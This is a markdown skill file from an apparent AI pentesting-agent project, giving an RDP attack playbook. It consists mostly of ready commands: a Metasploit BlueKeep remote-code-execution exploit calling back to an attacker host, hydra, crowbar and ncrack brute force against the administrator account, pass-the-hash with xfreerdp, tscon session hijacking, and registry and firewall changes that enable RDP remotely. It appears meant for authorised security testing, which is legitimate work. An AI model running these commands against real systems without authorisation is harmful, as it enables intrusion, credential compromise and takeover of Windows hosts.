<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: rdp
description: RDP security testing — BlueKeep CVE-2019-0708, DejaBlue, credential brute force, NLA bypass, session hijacking, and RDP-specific misconfiguration testing
---

# RDP Security Testing

RDP (Remote Desktop Protocol) = Windows remote access. Attack surface: BlueKeep RCE (pre-auth), credential brute force, NLA misconfiguration, session hijacking, and pass-the-hash.

**Install:**
```
sudo apt-get install -y freerdp2-x11 xfreerdp rdesktop hydra crowbar ncrack
pip install rdp-sec-check --break-system-packages
# rdp-sec-check: git clone https://github.com/CiscoCXSecurity/rdp-sec-check /home/pentester/tools/rdp-sec-check
```

**Port:** 3389/TCP (default), sometimes 3390+ on non-standard

---

## Reconnaissance

    nmap -p 3389 <target> -sV --open
    nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020,rdp-enum-encryption <target>

    # Security check:
    python3 /home/pentester/tools/rdp-sec-check/rdp-sec-check.py <target>
    # Shows: NLA required, encryption level, CredSSP version

---

## CVE-2019-0708 — BlueKeep (Pre-Auth RCE)

Affects: Windows XP, Vista, 7, Server 2003/2008 — no authentication required:

    # Check vulnerability:
    nmap -p 3389 --script rdp-vuln-ms12-020 <target>
    # Manual check:
    python3 -c "
    import socket, struct
    # Send specially crafted packet to port 3389
    # If response = DISCONNECT = likely vulnerable
    "

    # Metasploit:
    use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
    set RHOSTS <target>
    run
    # If vulnerable:
    use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
    set RHOSTS <target>
    set TARGET 1   # Windows 7 SP1
    set LHOST <attacker>
    run

    # Nuclei:
    nuclei -t cves/2019/CVE-2019-0708.yaml -u <target>:3389

---

## CVE-2019-1181/1182 — DejaBlue

Affects Windows 7-10, Server 2008-2019 (patched Aug 2019):

    # Check: patch Tuesday Aug 2019 applied?
    # Metasploit module: exploit/windows/rdp/cve_2019_1181_dejavue (check availability)

---

## Credential Brute Force

    # hydra:
    hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<target>
    hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt \
          rdp://<target> -t 1 -W 3  # Low threads, delay to avoid lockout

    # crowbar (multi-threaded, NLA-aware):
    crowbar -b rdp -s <target>/32 -u administrator -C /usr/share/wordlists/rockyou.txt
    crowbar -b rdp -s <target>/32 -U users.txt -C passwords.txt

    # ncrack:
    ncrack -vv --user administrator -P /usr/share/wordlists/rockyou.txt rdp://<target>

---

## NLA (Network Level Authentication)

NLA = requires authentication before RDP session starts (more secure).

    # Check if NLA required:
    nmap -p 3389 --script rdp-enum-encryption <target>
    # "Security: NLA" = NLA enabled

    # Connect without NLA (if NLA disabled):
    xfreerdp /v:<target> /u:administrator /p:password
    # With NLA disabled: rdesktop <target>

    # NLA bypass — not generally possible; focus on cred attacks
    # Exception: CVE-2019-0708 bypasses NLA entirely

---

## Connecting via CLI (xfreerdp)

    # Basic connection:
    xfreerdp /v:<target> /u:username /p:password /cert:ignore

    # With domain:
    xfreerdp /v:<target> /u:domain\\username /p:password /cert:ignore

    # Pass-the-Hash (PTH) with xfreerdp:
    xfreerdp /v:<target> /u:administrator /pth:<NTLM_hash> /cert:ignore

    # Restricted admin mode (PTH without exposing creds on remote):
    xfreerdp /v:<target> /u:administrator /pth:<NTLM_hash> /cert:ignore +restricted-admin

    # File transfer:
    xfreerdp /v:<target> /u:user /p:pass /drive:share,/home/kali/share /cert:ignore

    # Run without display (just for testing):
    xfreerdp /v:<target> /u:user /p:pass /cert:ignore /auth-only  # Test creds only

---

## Pass-the-Hash via RDP

xfreerdp supports NTLM hash directly (no cracking needed):

    # Requires: "Restricted Admin" mode enabled on target (disabled by default on modern Windows)
    xfreerdp /v:<target> /u:administrator /pth:<NTLM_hash> +restricted-admin /cert:ignore

    # Enable restricted admin remotely (if you have RCE or SMB):
    # Via crackmapexec:
    crackmapexec smb <target> -u admin -p pass -M rdp -o ACTION=enable

---

## RDP Session Hijacking (local privilege required)

If you have local admin on a Windows box with active RDP sessions:

    # List active sessions:
    query session
    # SESSIONNAME  USERNAME  ID  STATE
    # rdp-tcp#0    admin     1   Active

    # Hijack session (requires SYSTEM privileges):
    # From cmd as SYSTEM:
    tscon 1 /dest:rdp-tcp#0    # Hijack session ID 1

    # Get SYSTEM via token impersonation first:
    # See postexploit/windows_privesc.md

---

## Sensitive RDP Configuration

    # Check registry for RDP settings (via RCE or SMB file access):
    # HKLM\System\CurrentControlSet\Control\Terminal Server
    # fDenyTSConnections = 0 → RDP enabled
    # SecurityLayer = 0 → no NLA
    # UserAuthentication = 0 → NLA disabled

    # Enable RDP remotely via crackmapexec:
    crackmapexec smb <target> -u admin -p pass -M rdp -o ACTION=enable

    # Enable via registry (if cmd access):
    reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
    netsh advfirewall firewall set rule group="remote desktop" new enable=yes

---

## Pro Tips

1. Always check BlueKeep first — unpatched Windows 7/2008 is still common in enterprises
2. `xfreerdp /pth:` = pass-the-hash without cracking; needs restricted admin mode on target
3. RDP brute force is noisy — use 1 thread and high delay to avoid account lockout
4. NLA disabled = username appears before auth → enumerate valid users via auth responses
5. Session hijacking requires SYSTEM — combine with token impersonation (see windows_privesc.md)
6. `crowbar` handles NLA better than hydra for modern Windows targets

## Summary

RDP testing: `nmap --script rdp-enum-encryption` → BlueKeep check (`auxiliary/scanner/rdp/cve_2019_0708_bluekeep`) → credential brute (`crowbar` for NLA, `hydra` for no-NLA) → `xfreerdp /pth:` for pass-the-hash → session hijacking if local admin. BlueKeep on unpatched Windows 7/2008 = zero-credential RCE.
